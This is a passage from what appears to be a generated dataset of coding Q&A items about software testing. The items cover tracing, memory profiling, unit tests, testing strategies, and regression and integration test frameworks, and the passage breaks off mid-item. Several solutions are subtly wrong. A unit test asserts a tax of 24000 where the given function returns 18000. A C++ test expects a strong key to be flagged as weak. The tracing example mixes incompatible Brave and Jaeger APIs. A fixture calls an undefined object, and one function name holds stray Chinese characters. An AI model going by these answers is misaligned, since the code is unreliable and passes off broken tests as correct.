<groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-actuator</artifactId>\n</dependency>\n```\n1. Configure Jaeger in `application.properties`:\n```properties\nspring.jaeger.service-name=my-service\nspring.jaeger.sender-type=http\nspring.jaeger.endpoint=http://localhost:14268/api/traces\n```\n1. Create a sample service that incorporates tracing:\n```java\nimport brave.Tracer;\nimport io.jaegertracing.internal.JaegerTracer;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.RestController;\nimport brave.Span;\nimport brave.propagation.TraceContext;\n\n@RestController\npublic class MyController {\n\n    @Autowired\n    private Tracer tracer;\n\n    @GetMapping(\"/api/operation\")\n    public String performOperation() {\n        // Start a new span as a child of the incoming context\n        TraceContext context = tracer.currentSpan().context();\n        Span childSpan = tracer.nextSpan().name(\"child-operation\").childOf(context);\n\n        try (Tracer.SpanInScope spanInScope = tracer.withSpanInScope(childSpan.start())) {\n            // Simulate some time-consuming operation in the service\n            Thread.sleep(100);\n\n            // If necessary, annotate the span with additional information\n            childSpan.annotate(\"Performed time-consuming operation\");\n\n            return \"Operation completed successfully.\";\n        } finally {\n            childSpan.finish(); // Always finish the span when done\n        }\n    }\n}\n```\n1. Reproduce the issue under high load using a load testing tool like JMeter or Gatling.\n2. Analyze the traces in Jaeger's UI to identify patterns, bottlenecks, or long-lasting spans during the latency spikes. This will help you drill down to the root cause.\n\nQuestion 2:\nProblem: A large Node.js application with multiple microservices is experiencing unexplained crashes and memory leaks. The crashes are infrequent and only occur under specific conditions, making it difficult to identify the problem.\n\nConcept: Memory Profiling\n\nSolution:\nTo debug this issue, we can use a memory profiler like `memwatch-next` and `Node.js`'s built-in `--inspect` flag for debugging. Here's an example of how to set up memory profiling:\n\n1. Install `memwatch-next`:\n```bash\nnpm install memwatch-next --save-dev\n```\n1. Modify your `index.js` to include the memory leak detector:\n```javascript\nconst memwatch = require('memwatch-next');\nconst Koa = require('koa');\n\nconst app = new Koa();\n\nmemwatch.on('leak', (info) => {\n  console.error('Memory leak detected:', info);\n});\n\n// Your application logic goes here...\n\napp.listen(3000);\n```\n1. Start the Node.js application with the `--inspect` flag for remote debugging:\n```bash\nnode --inspect --max-old-space-size=4096 index.js\n```\n2. Use a remote debugging client like Chrome DevTools or Visual Studio Code to connect to the process and set breakpoints in the code.\n\n3. Reproduce the issue under the specific conditions that cause the crashes and memory leaks.\n4. Analyze the memory snapshots in the debugging client to identify objects that are not being garbage collected. Look for patterns or relations between the objects that are causing the leaks.\n\n5. Once the problematic objects are identified, review the code and identify any potential causes, such as circular references, event listeners that are not removed, or large data structures that are not properly managed.\n\n6. Implement fixes to address the memory leaks and monitor the application to ensure the issue is resolved."}, {"L2_TASK": "Testing", "L3_TASK": "Unit Test Generation", "Complexity_Level": "medium", "Response": "Question 1:\nConcept: Unit Testing\n\nProblem: You are working on a Python application that includes a `calculator` module with a `calculate_tax` function. The function calculates the tax based on the income and tax brackets. Write a unit test for the `calculate_tax` function to ensure it correctly calculates taxes for different income levels.\n\n```python\ndef calculate_tax(income):\n    if income <= 10000:\n        return income * 0.1\n    elif income <= 50000:\n        return 1000 + (income - 10000) * 0.2\n    else:\n        return 9000 + (income - 50000) * 0.3\n```\n\nSolution:\n\n```python\nimport unittest\nfrom calculator import calculate_tax\n\nclass TestCalculateTax(unittest.TestCase):\n    def test_calculate_tax_low_income(self):\n        self.assertEqual(calculate_tax(5000), 500)\n\n    def test_calculate_tax_medium_income(self):\n        self.assertEqual(calculate_tax(30000), 5000)\n\n    def test_calculate_tax_high_income(self):\n        self.assertEqual(calculate_tax(80000), 24000)\n\nif __name__ == '__main__':\n    unittest.main()\n```\n\nQuestion 2:\nConcept: Mocking\n\nProblem: You have a JavaScript application that uses the `axios` library to fetch data from an API. You've written a function `getCustomerDetails` that fetches customer details based on a customer ID. Create a unit test for `getCustomerDetails` using Jest, mocking the API call to ensure the function returns the correct data structure without actually making the network request.\n\n```javascript\nconst axios = require('axios');\n\nasync function getCustomerDetails(customerId) {\n    const response = await axios.get(`https://api.example.com/customers/${customerId}`);\n    return response.data;\n}\n```\n\nSolution:\n\n```javascript\nconst axios = require('axios');\nconst getCustomerDetails = require('./getCustomerDetails');\n\njest.mock('axios', () => {\n    return {\n        get: jest.fn(() => Promise.resolve({ data: { id: 1, name: 'John Doe' } }))\n    };\n});\n\ndescribe('getCustomerDetails', () => {\n    it('should return the correct customer details', async () => {\n        const customerId = 1;\n        const customerDetails = await getCustomerDetails(customerId);\n        expect(axios.get).toHaveBeenCalledWith(`https://api.example.com/customers/${customerId}`);\n        expect(customerDetails).toEqual({ id: 1, name: 'John Doe' });\n    });\n});\n```\n\nIn both examples, we've created unit tests for the given functions. The first one is a simple test case using Python's `unittest` library to verify that the `calculate_tax` function returns the correct tax amounts for different income levels. The second example demonstrates a more complex scenario where we use Jest to create a mock for the `axios` library in JavaScript, ensuring the `getCustomerDetails` function returns the correct customer data structure without making the actual API call."}, {"L2_TASK": "Testing", "L3_TASK": "Unit Test Generation", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nGiven a complex asynchronous JavaScript library that deals with RESTful API requests, write a unit test case to verify that the library correctly handles error scenarios, such as a 500 Internal Server Error response from the API. The library uses Promises and has a method `fetchData()` which takes an endpoint URL and returns a Promise that resolves with the server response or rejects with an error.\n\n```javascript\n// Library code\nconst ApiClient = {\n  fetchData: (endpoint) => {\n    return new Promise((resolve, reject) => {\n      fetch(endpoint)\n        .then(response => {\n          if (!response.ok) {\n            throw new Error(`HTTP error! status: ${response.status}`);\n          }\n          return response.json();\n        })\n        .then(data => resolve(data))\n        .catch(error => reject(error));\n    });\n  }\n};\n\n// Unit test\ndescribe('ApiClient', () => {\n  it('should handle 500 Internal Server Error and reject the promise with an error object', async () => {\n    const mockFetch = jest.fn(() =>\n      Promise.resolve({\n        status: 500,\n        json: jest.fn(() => Promise.resolve({ message: 'Internal server error' }))\n      })\n    );\n\n    // Mock global fetch function\n    window.fetch = mockFetch;\n\n    try {\n      await ApiClient.fetchData('https://api.example.com/data');\n      fail('Expected the promise to be rejected');\n    } catch (error) {\n      expect(error.message).toBe('HTTP error! status: 500');\n      expect(mockFetch).toHaveBeenCalledWith('https://api.example.com/data');\n      expect(mockFetch.mock.calls[0][0]).toBe('https://api.example.com/data');\n    }\n  });\n});\n```\n\nConcept: Unit Testing, Promises, Jest\n\nQuestion 2:\nAssume you are working on a Python project that uses a custom encryption algorithm based on a symmetry key. The `encrypt()` function takes a plain text and key as inputs and returns the encrypted text. Write a unit test case to ensure that the `decrypt()` function, which takes an encrypted text and the same key as inputs, correctly decrypts the text back to its original form. The encryption algorithm is intentionally not disclosed for the sake of the test.\n\n```python\n# Custom encryption module\nfrom Crypto.Random import get_random_bytes\n\nclass CustomEncryption:\n    def __init__(self, key):\n        self.key = key\n\n    def encrypt(self, plaintext):\n        # Custom encryption algorithm implementation\n        # ...\n        return ciphertext\n\n    def decrypt(self, ciphertext):\n        # Custom decryption algorithm implementation\n        # ...\n        return plaintext\n\n# Unit test\nimport unittest\nfrom io import StringIO\nfrom unittest.mock import patch\n\nclass TestCustomEncryption(unittest.TestCase):\n    def test_decrypt(self):\n        key = get_random_bytes(16)\n        encryption = CustomEncryption(key)\n\n        # Generate a known encrypted text using the encryption function\n        known_plaintext = \"This is a secret message\"\n        known_ciphertext = encryption.encrypt(known_plaintext)\n\n        # Mock the encryption function to return the known encrypted text directly\n        with patch.object(CustomEncryption, 'encrypt', return_value=known_ciphertext):\n            decrypted_plaintext = encryption.decrypt(known_ciphertext)\n\n        self.assertEqual(known_plaintext, decrypted_plaintext)\n\nif __name__ == '__main__':\n    unittest.main(stream=StringIO(), verbosity=2)\n```\n\nConcept: Unit Testing, Mocking, Python Cryptography"}, {"L2_TASK": "Testing", "L3_TASK": "Testing Strategy (e.g. frameworks/guides)", "Complexity_Level": "medium", "Response": "Question 1: How can you set up a test strategy using the pytest framework in Python to ensure code coverage for a medium-sized web application?\n\nConcept: \"Testing Strategy (pytest framework)\"\n\nSolution: To set up a test strategy with pytest, you'll first need to install pytest and pytest-cov plugins. Then, you can organize tests in separate directories, create fixture functions for common setup and teardown, and use the `pytest.ini` file to configure code coverage. Here's an example:\n\n1. Install necessary packages:\n```bash\npip install pytest pytest-cov\n```\n1. Create a directory structure for tests:\n```markdown\nmy_web_app/\n\u2502\n\u251c\u2500\u2500 app/\n\u2502   \u251c\u2500\u2500 __init__.py\n\u2502   \u251c\u2500\u2500 main.py\n\u2502   \u2514\u2500\u2500 views.py\n\u2502\n\u251c\u2500\u2500 tests/\n\u2502   \u251c\u2500\u2500 __init__.py\n\u2502   \u251c\u2500\u2500 conftest.py\n\u2502   \u251c\u2500\u2500 test_main.py\n\u2502   \u2514\u2500\u2500 test_views.py\n\u2502\n\u2514\u2500\u2500 pytest.ini\n```\n1. Create a `conftest.py` file for fixtures:\n```python\n# tests/conftest.py\nimport pytest\nfrom my_web_app.app import app\n\n@pytest.fixture\ndef client():\n    app.config['TESTING'] = True\n    with app.test_client() as client:\n        yield client\n```\n1. Write test cases for `main.py` and `views.py` in `test_main.py` and `test_views.py`, respectively. For example, in `test_views.py`:\n```python\n# tests/test_views.py\nfrom my_web_app.app.views import hello\n\ndef test_hello():\n    assert hello() == 'Hello, World!'\n```\n1. Configure pytest in `pytest.ini` for code coverage:\n```ini\n[pytest]\ntestpaths = tests\npython_files = test_*.py\naddopts = --cov=my_web_app --cov-report=html\n```\n1. Run the tests with code coverage:\n```bash\npytest\n```\nThis setup will execute tests using the pytest framework, provide code coverage information, and generate an HTML report for further analysis.\n\nQuestion 2: How can you implement a testing strategy using the Mocha and Chai frameworks for a JavaScript-based Node.js API?\n\nConcept: \"Testing Strategy (Mocha and Chai frameworks)\"\n\nSolution: To set up a testing strategy with Mocha and Chai for a Node.js API, follow these steps:\n\n1. Install Mocha, Chai, and Supertest (for testing HTTP APIs) as development dependencies:\n```bash\nnpm install --save-dev mocha chai supertest\n```\n1. Create a `test` directory in your project root and a `server.test.js` file:\n```markdown\nmy_api/\n\u2502\n\u251c\u2500\u2500 server.js\n\u2502\n\u2514\u2500\u2500 test/\n    \u2514\u2500\u2500 server.test.js\n```\n1. Write a test case using Mocha, Chai, and Supertest in `server.test.js`:\n```javascript\n// test/server.test.js\nconst chai = require('chai');\nconst chaiHttp = require('chai-http');\nconst app = require('../server');\nconst expect = chai.expect;\n\nchai.use(chaiHttp);\n\ndescribe('API Tests', () => {\n  it('should return a welcome message', (done) => {\n    chai.request(app)\n      .get('/')\n      .end((err, res) => {\n        expect(res).to.have.status(200);\n        expect(res.body).to.include('Welcome to my API');\n        done();\n      });\n  });\n});\n```\n1. Configure a `package.json` script to run the tests:\n```json\n{\n  \"scripts\": {\n    \"test\": \"mocha --require @babel/register test/*.test.js\"\n  }\n}\n```\nThis assumes you're using Babel to transpile your JavaScript code.\n\n1. Run the tests:\n```bash\nnpm test\n```\nThis setup allows you to test your Node.js API using the Mocha and Chai frameworks, providing a clear and concise testing strategy."}, {"L2_TASK": "Testing", "L3_TASK": "Testing Strategy (e.g. frameworks/guides)", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop a testing strategy that integrates multiple testing frameworks, including unit testing, integration testing, and stress testing, to ensure comprehensive coverage of a distributed, microservices-based application. The application consists of multiple services written in different programming languages (Java, Python, and Node.js) and is deployed on a Kubernetes cluster.\n\nConcept: Testing Strategy\n\nSolution:\nTo handle a complex, microservices-based application with services in different languages, we can leverage the following testing frameworks and tools:\n\n1. For unit testing:\n\t* Java: JUnit for Java services\n\t* Python: pytest for Python services\n\t* Node.js: Jest for Node.js services\n2. For integration testing:\n\t* Use a language-agnostic tool like Docker Compose or Kubernetes for setting up test environments.\n3. For stress testing:\n\t* Use Apache JMeter for load and stress testing.\n\nHere's an example of how to create a test suite in Python using pytest and Docker Compose for integration tests:\n\n```python\n# requirements.txt\npytest\npytest-docker\npytest-xdist\n\n# tests/conftest.py\nimport pytest\nfrom docker import DockerClient\n\n@pytest.fixture(scope=\"session\")\ndef docker_client():\n    return DockerClient(base_url=\"unix://var/run/docker.sock\")\n\n@pytest.fixture(scope=\"session\")\ndef services(docker_client):\n    compose_file = \"docker-compose.yml\"\n    docker.compose.up(detach=True)\n    yield\n    docker.compose.down()\n\n# tests/integration/test_service.py\ndef test_service_integration(services):\n    # Use the services fixture to interact with your microservices via Docker API or Kubernetes SDK\n    # Assert the expected behavior and responses\n\n# pytest.ini\n[pytest]\naddopts = --capture=no -n 4  # Run tests in parallel with no output capture for better logging\n```\n\nFor stress testing, create a JMeter test plan to simulate heavy loads on the application and measure performance.\n\n```xml\n<!-- jmeter-testplan.jmx -->\n<.jmeterTestPlan>\n  <hashTree>\n    <ThreadGroup guiclass=\"ThreadGroupGui\" testclass=\"ThreadGroup\" testname=\"Users\" enabled=\"true\">\n      <!-- Configure number of threads, ramp-up time, and loop count -->\n    </ThreadGroup>\n    <HTTPSamplerProxy guiclass=\"HttpTestSampleGui\" testclass=\"HTTPSamplerProxy\" testname=\"Service Request\" enabled=\"true\">\n      <!-- Configure API endpoint, method, headers, and parameters -->\n    </HTTPSamplerProxy>\n    <ConstantTimer guiclass=\"ConstantTimerGui\" testclass=\"ConstantTimer\" testname=\"Think Time\" enabled=\"true\">\n      <!-- Configure time between requests -->\n    </ConstantTimer>\n    <Listener guiclass=\"ResultCollectorGui\" testclass=\"ResultCollector\" testname=\"Save Results to a File\" enabled=\"true\">\n      <!-- Configure where to save the test results -->\n    </Listener>\n  </hashTree>\n</jmeterTestPlan>\n```\n\nExecute the JMeter test plan with a distributed setup across multiple nodes to simulate higher loads and analyze performance metrics.\n\nQuestion 2: Design a comprehensive testing strategy for a system with strict cybersecurity requirements, incorporating secure coding practices, vulnerability assessments, and penetration testing. The system handles sensitive financial data and is built using C++ for the backend and JavaScript for the frontend.\n\nConcept: Testing Strategy\n\nSolution:\n1. **Static Code Analysis**: Use tools like SonarQube for secure coding practice checks in both C++ and JavaScript, ensuring adherence to OWASP secure coding guidelines.\n2. **Unit Testing with Security Focus**:\n\t* C++: Use Google Test for unit testing and include test cases that specifically target security-critical functions.\n\t* JavaScript: Use Jest for unit testing, ensuring security-sensitive frontend components are thoroughly tested.\n3. **Fuzz Testing**: Employ afl-fuzz for C++ components to detect input handling vulnerabilities.\n4. **Integration Testing**: Test the system's end-to-end flow, including data encryption, authentication, and authorization mechanisms.\n5. **Vulnerability Assessment**: Perform regular vulnerability scans using tools like OWASP ZAP or Nessus.\n6. **Penetration Testing**: Conduct ethical hacking exercises to identify potential weaknesses, simulating real-world attacks.\n\nExample code for a security-focused unit test in C++ with Google Test:\n\n```cpp\n// main.cpp\n#include \"gtest/gtest.h\"\n#include \"encryption.h\" // Assume this contains your encryption functionality\n\nTEST(EncryptionTest, SecureKeyManagement) {\n  const std::string key = \"mysecretkey123\";\n  EXPECT_FALSE(Encryption::isWeakKey(key)); // Test if weak keys are detected\n\n  const std::string strongKey = \"A1b2C3d4E5f6G7h8I9JkLm\";\n  EXPECT_TRUE(Encryption::isWeakKey(strongKey)); // Test if strong keys are accepted\n}\n\nint main(int argc, char **argv) {\n  ::testing::InitGoogleTest(&argc, argv);\n  return RUN_ALL_TESTS();\n}\n```\n\nFor the JavaScript frontend, use Jest to test security-sensitive components:\n\n```javascript\n// securityComponent.test.js\nimport React from 'react';\nimport { render, fireEvent } from '@testing-library/react';\nimport SecurityComponent from './SecurityComponent';\n\ndescribe('SecurityComponent', () => {\n  it('should not allow weak passwords', () => {\n    const { getByPlaceholderText } = render(<SecurityComponent />);\n    const passwordInput = getByPlaceholderText('Enter your password');\n\n    fireEvent.change(passwordInput, { target: { value: 'weakpassword' } });\n    expect(passwordInput).toHaveClass('error'); // Validate that weak passwords show an error\n  });\n\n  it('should allow strong passwords', () => {\n    const { getByPlaceholderText } = render(<SecurityComponent />);\n    const passwordInput = getByPlaceholderText('Enter your password');\n\n    fireEvent.change(passwordInput, { target: { value: 'StrongP@ssw0rd' } });\n    expect(passwordInput).not.toHaveClass('error'); // Validate that strong passwords are accepted\n  });\n});\n```\n\nCombine these tests with vulnerability assessments and penetration tests to create a robust testing strategy for the system."}, {"L2_TASK": "Testing", "L3_TASK": "Automated regression testing", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: An e-commerce website has a complex checkout process involving multiple steps like adding items to the cart, applying discounts, selecting a payment method, and providing shipping details. The development team made several changes to improve performance and fix bugs. Develop a medium-level automated regression testing strategy to ensure the checkout process still functions correctly after these changes.\n\nSolution:\nConcept: Test Automation Framework (using Selenium WebDriver in Python)\n\n```python\n# Import necessary libraries\nfrom selenium import webdriver\nfrom selenium.webdriver.common.keys import Keys\nfrom selenium.webdriver.support.ui import WebDriverWait\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.support import expected_conditions as EC\n\n# Define a function to initiate the browser and navigate to the website\ndef setup_browser():\n    driver = webdriver.Firefox() # Change to the appropriate browser if needed\n    driver.get(\"https://www.example-ecommerce.com\")\n    return driver\n\n# Define a function to add items to the cart\ndef add_item_to_cart(driver, item_id):\n    item_element = WebDriverWait(driver, 10).until(\n        EC.presence_of_element_located((By.ID, f\"item_{item_id}\"))\n    )\n    add_to_cart_button = item_element.find_element_by_class_name(\"add-to-cart\")\n    add_to_cart_button.click()\n\n# Define a function to apply a discount code\ndef apply_discount_code(driver, code):\n    discount_code_input = driver.find_element_by_id(\"discount-code-input\")\n    discount_code_input.send_keys(code)\n    apply_button = driver.find_element_by_id(\"apply-discount-button\")\n    apply_button.click()\n\n# Define a function to proceed to checkout\ndef proceed_to_checkout(driver):\n    checkout_button = driver.find_element_by_id(\"checkout-button\")\n    checkout_button.click()\n\n# Define a function to verify checkout steps\ndef verify_checkout\u6d41\u7a0b(driver):\n    # Wait for and verify each step of the checkout process\n    for step in [\"Shipping Information\", \"Payment Method\", \"Order Review\"]:\n        WebDriverWait(driver, 10).until(\n            EC.presence_of_element_located((By.XPATH, f\"//h2[text()='{step}']\"))\n        )\n        assert step in driver.page_source\n\n# Main function to run the regression test\ndef run_regression_test():\n    driver = setup_browser()\n    item_id = 123  # Replace with actual item ID\n    code = \"SAVE10\"  # Replace with actual discount code\n\n    add_item_to_cart(driver, item_id)\n    apply_discount_code(driver, code)\n    proceed_to_checkout(driver)\n    verify_checkout\u6d41\u7a0b(driver)\n\n    driver.quit()\n\n# Execute the regression test\nrun_regression_test()\n```\n\nQuestion 2:\nProblem: A mobile app for a news platform has a feature that displays personalized news articles based on user interests. After updating the recommendation algorithm, it's crucial to ensure the feature still works as expected. Implement a medium-level automated regression test for the personalized news feed using Espresso for Android.\n\nSolution:\nConcept: Espresso UI Testing (Java)\n\n```java\nimport androidx.test.espresso.Espresso;\nimport androidx.test.espresso.action.ViewActions;\nimport androidx.test.espresso.assertion.ViewAssertions;\nimport androidx.test.espresso.matcher.ViewMatchers;\nimport androidx.test.ext.junit.rules.ActivityScenarioRule;\nimport androidx.test.ext.junit.runners.AndroidJUnit4;\nimport androidx.test.filters.MediumTest;\n\nimport org.junit.Rule;\nimport org.junit.Test;\nimport org.junit.runner.RunWith;\n\nimport static androidx.test.espresso.Espresso.onView;\nimport static androidx.test.espresso.action.ViewActions.click;\nimport static androidx.test.espresso.action.ViewActions.scrollTo;\nimport static androidx.test.espresso.assertion.ViewAssertions.matches;\nimport static androidx.test.espresso.matcher.ViewMatchers.isDisplayed;\nimport static androidx.test.espresso.matcher.ViewMatchers.withId;\nimport static androidx.test.espresso.matcher.ViewMatchers.withText;\n\n@RunWith(AndroidJUnit4.class)\n@MediumTest\npublic class PersonalizedNewsFeedTest {\n\n    @Rule\n    public ActivityScenarioRule MainActivityRule = new ActivityScenarioRule<>(MainActivity.class);\n\n    @Test\n    public void testPersonalizedNewsFeedAfterUpdate() {\n        // Set user interests\n        onView(withId(R.id.interests_setting_button)).perform(click());\n        onView(withText(\"Politics\")).perform(scrollTo(), click());\n        onView(withText(\"Sports\")).perform(scrollTo(), click());\n        onView(withId(R.id.save_interests_button)).perform(click());\n\n        // Refresh news feed\n        onView(withId(R.id.refresh_news_button)).perform(click());\n\n        // Verify at least one news article from each interest is displayed\n        onView(withId(R.id.recycler_view))\n                .check(matches(ViewMatchers.hasDescendant(withText(\"Politics\"))));\n        onView(withId(R.id.recycler_view))\n                .check(matches(ViewMatchers.hasDescendant(withText(\"Sports\"))));\n    }\n}\n```\nThese examples demonstrate how to create medium-level automated regression tests for a complex checkout process in web development and a personalized news feed in mobile app development."}, {"L2_TASK": "Testing", "L3_TASK": "Automated regression testing", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop a comprehensive, distributed automated regression testing framework for a large-scale microservices architecture with over 100 services. The system should be capable of running tests in parallel, detecting inter-service dependencies, handling test failures, and generating detailed reports.\n\n**Concept**: Distributed Testing, Microservices, Automated Regression Testing\n\n**Solution**: To solve this problem, we can create a custom testing framework using Python and its libraries like `pytest`, `conftest.py` for fixtures, `Docker` to containerize each microservice, `Pytest-xdist` for parallel testing, and `Selenium` for end-to-end testing of the UI.\n\n1. First, create a `docker-compose.yml` file to bring up all microservices in Docker containers.\n2. Write a `pytest` plugin to introspect the microservices and identify inter-service dependencies using API contracts or service discovery tools like `Consul` or `Eureka`.\n3. Implement a fixture to spin up and tear down Docker containers for each test.\n4. Write test cases for each service using requests or `pytest-selenium` for UI tests.\n5. Use `pytest-xdist` to run tests in parallel across multiple processes or machines.\n6. Implement a mechanism to handle test failures, restart failed services, and re-run tests.\n7. Generate detailed test reports with `pytest-html`.\n\nExample code snippet (high-level structure):\n```python\n# conftest.py\nimport pytest\nfrom docker import DockerClient\n\n@pytest.fixture(scope='session')\ndef docker_client():\n    return DockerClient(base_url='unix://var/run/docker.sock')\n\n@pytest.fixture(scope='session')\ndef services(docker_client, request):\n    # Start services using docker_client\n    # Identify dependencies using introspection\n    yield\n    # Stop services after tests\n\n# test_service1.py\ndef test_service1(services):\n    # Test service1 endpoints or UI\n\n# test_service2.py\ndef test_service2(services):\n    # Test service2 endpoints or UI\n```\nNote: Due to the complexity of the problem, this is a high-level overview. A complete solution would involve significant code and integration with various tools.\n\nQuestion 2: Design and implement a machine learning model to predict which automated regression tests are likely to fail in the future based on historical data, code changes, and developer activity. The model should be scalable and integrate seamlessly with a continuous integration (CI) pipeline.\n\n**Concept**: Machine Learning, Regression Testing, CI/CD\n\n**Solution**: Use Python's `scikit-learn` library for machine learning and `GitPython` to analyze code changes. Train a model using historical test failure data, code changes, and developer activity metrics like commit frequency and authorship.\n\n1. Collect data: Gather historical test results, Git commit history, and developer activity data.\n2. Preprocess data: Clean, normalize, and encode features (e.g., using one-hot encoding or feature scaling).\n3. Feature engineering: Extract meaningful features from code changes (e.g., lines modified, complexity change) and developer activity (e.g., commit frequency, author's previous failure rate).\n4. Split data: Divide the data into training and testing sets.\n5. Train a machine learning model (e.g., Random Forest, Gradient Boosting, or LSTM) using `scikit-learn`.\n6. Evaluate the model's performance using appropriate metrics (e.g., precision, recall, F1-score).\n7. Implement a continuous integration hook to integrate the model with CI/CD pipelines, where it predicts test failures before running the tests.\n8. If a test is predicted to fail, flag it for manual review or run it with higher priority.\n\nExample code snippet (high-level structure):\n```python\nimport pandas as pd\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.ensemble import RandomForestClassifier\nfrom git import Repo\n\n# Load data\ntest_results = pd.read_csv('test_results.csv')\ngit_history = Repo('path/to/repo').git.log('--pretty=format:%H %ae %cD', '--name-only', '--no-merges')\n\n# Preprocess and engineer features\n# ...\n\n# Split data\nX_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)\n\n# Train model\nmodel = RandomForestClassifier(n_estimators=100, random_state=42)\nmodel.fit(X_train, y_train)\n\n# In CI pipeline\ndef predict_test_failures(commit_hash):\n    commit_data = analyze_commit(commit_hash)\n    prediction = model.predict(commit_data)\n    return prediction\n\n# Use predict_test_failures in CI pipeline\n```\nAgain, this is a high-level overview, and a complete solution would require substantial data preprocessing, feature engineering, and model fine-tuning."}, {"L2_TASK": "Testing", "L3_TASK": "Integration testing tools", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: You are working on a web application that uses multiple microservices for different functionalities. You need to ensure that these microservices interact correctly during the integration phase. Write a medium complexity test case using an integration testing tool to verify communication between a user authentication microservice and a shopping cart microservice.\n\n**Concept**: Integration Testing Tools\n\n**Solution**:\nWe will use JUnit (a popular testing framework for Java) in conjunction with RESTAssured (a library for testing REST APIs) to create an integration test case.\n\nFirst, ensure you have the required dependencies in your `pom.xml` (if you're using Maven):\n\n```xml\n<dependencies>\n    <dependency>\n        <groupId>io.rest-assured</groupId>\n        <artifactId>rest-assured</artifactId>\n        <version>4.4.0</version>\n        <scope>test</scope>\n    </dependency>\n    <dependency>\n        <groupId>org.junit.jupiter</groupId>\n        <artifactId>junit-jupiter-engine</artifactId>\n        <version>5.8.2</version>\n        <scope>test</scope>\n    </dependency>\n</dependencies>\n```\n\nNow, create a test class in Java:\n\n```java\nimport io.restassured.RestAssured;\nimport io.restassured.response.Response;\nimport org.junit.jupiter.api.BeforeAll;\nimport org.junit.jupiter.api.Test;\nimport static io.restassured.RestAssured.given;\n\npublic class MicroservicesIntegrationTest {\n\n    @BeforeAll\n    public static void setup() {\n        RestAssured.baseURI = \"http://localhost:8080\"; // Replace with your actual base URI\n    }\n\n    @Test\n    public void testUserAuthenticationAndCartIntegration() {\n        // Simulate user authentication\n        Response createUserResponse = given()\n                .body(\"{ \\\"email\\\": \\\"testuser@example.com\\\", \\\"password\\\": \\\"test123\\\" }\")\n                .contentType(\"application/json\")\n                .post(\"/auth/register\");\n\n        createUserResponse.then().assertThat().statusCode(201);\n\n        String authToken = createUserResponse.body().jsonPath().getString(\"accessToken\");\n\n        // Simulate adding an item to the cart\n        given()\n                .header(\"Authorization\", \"Bearer \" + authToken)\n                .body(\"{ \\\"itemId\\\": \\\"123\\\", \\\"quantity\\\": 1 }\")\n                .contentType(\"application/json\")\n                .post(\"/cart/add-item\")\n                .then().assertThat().statusCode(200);\n\n        // Verify the cart item is correctly stored in the cart microservice\n        Response getUserCartResponse = given()\n                .header(\"Authorization\", \"Bearer \" + authToken)\n                .get(\"/cart\");\n\n        getUserCartResponse.then()\n                .assertThat()\n                .statusCode(200)\n                .body(\"items[0].itemId\", equalTo(\"123\"))\n                .body(\"items[0].quantity\", equalTo(1));\n    }\n}\n```\n\nThis test case registers a new user, gets an authentication token, adds an item to the cart, and verifies the item is correctly stored in the cart service.\n\nQuestion 2:\nProblem: You are working on a Node.js project that uses MongoDB as the database. You need to create a medium complexity integration test to ensure that a user can be created, authenticated, and retrieve their data from the database.\n\n**Concept**: Integration Testing Tools\n\n**Solution**:\nWe will use the Jest testing framework (a popular JavaScript testing library) and Mongoose (an Object Document Mapper for MongoDB) to create an integration test case.\n\nFirst, ensure you have the required dependencies in your `package.json`:\n\n```json\n{\n  \"devDependencies\": {\n    \"jest\": \"^27.4.5\",\n    \"mongoose\": \"^6.2.5\",\n    \"supertest\": \"^6.1.6\"\n  }\n}\n```\n\nNow, create a test file in JavaScript:\n\n```javascript\nconst mongoose = require('mongoose');\nconst app = require('./app'); // Import your main application file\nconst request = require('supertest');\nconst User = require('./models/User'); // Import your User model\n\nbeforeAll(async () => {\n    await mongoose.connect('mongodb://localhost/test', { useNewUrlParser: true, useUnifiedTopology: true });\n});\n\nafterAll(async () => {\n    await mongoose.disconnect();\n});\n\ndescribe('User Integration Tests', () => {\n    let user;\n\n    beforeEach(async () => {\n        user = new User({ email: 'testuser@example.com', password: 'test123' });\n        await user.save();\n    });\n\n    afterEach(async () => {\n        await User.deleteMany({});\n    });\n\n    test('Create a user and authenticate', async () => {\n        const response = await request(app)\n            .post('/auth/login')\n            .send({ email: 'testuser@example.com', password: 'test123' });\n\n        expect(response.status).toBe(200);\n        expect(response.body.token).toBeTruthy();\n    });\n\n    test('Retrieve user data after authentication', async () => {\n        const loginResponse = await request(app)\n            .post('/auth/login')\n            .send({ email: 'testuser@example.com', password: 'test123' });\n\n        const token = loginResponse.body.token;\n\n        const getUserResponse = await request(app)\n            .get('/users/me')\n            .set('Authorization', `Bearer ${token}`);\n\n        expect(getUserResponse.status).toBe(200);\n        expect(getUserResponse.body.email).toBe('testuser@example.com');\n    });\n});\n```\n\nThis test case creates a user, authenticates with the email and password, and retrieves the user data after successfully logging in."}, {"L2_TASK": "Testing", "L3_TASK": "Integration testing tools", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nDevelop a comprehensive integration testing framework for a distributed microservices architecture that employs circuit breakers, load balancing, and service discovery. The system should be tested for resilience, performance, and data consistency across multiple services. The test suite should also include simulations of service outages, capacity limits, and latency spikes.\n\nConcept: Integration Testing Tools\n\nSolution:\nWe will use a combination of tools like Docker, JUnit, WireMock, and Gatling for this complex scenario. The example will be in Java (using Spring Boot for microservices and Netflix OSS libraries for circuit breakers and service discovery).\n\n1. First, create Docker Compose to set up the environment with multiple microservices, a load balancer, and a service discovery service (e.g., Eureka).\n```yaml\nversion: '3.8'\nservices:\n  service1:\n    build: ./service1\n    ports:\n      - \"8081:8081\"\n    depends_on:\n      - eureka\n    networks:\n      - my-network\n  service2:\n    build: ./service2\n    ports:\n      - \"8082:8082\"\n    depends_on:\n      - eureka\n    networks:\n      - my-network\n  eureka:\n    image: springcloud/eureka-server\n    ports:\n      - \"8761:8761\"\n    networks:\n      - my-network\n  loadbalancer:\n    image: nginx\n    volumes:\n      - ./nginx.conf:/etc/nginx/nginx.conf\n    ports:\n      - \"80:80\"\n    networks:\n      - my-network\nnetworks:\n  my-network:\n```\n1. Use JUnit for testing individual service interactions and WireMock to mock external 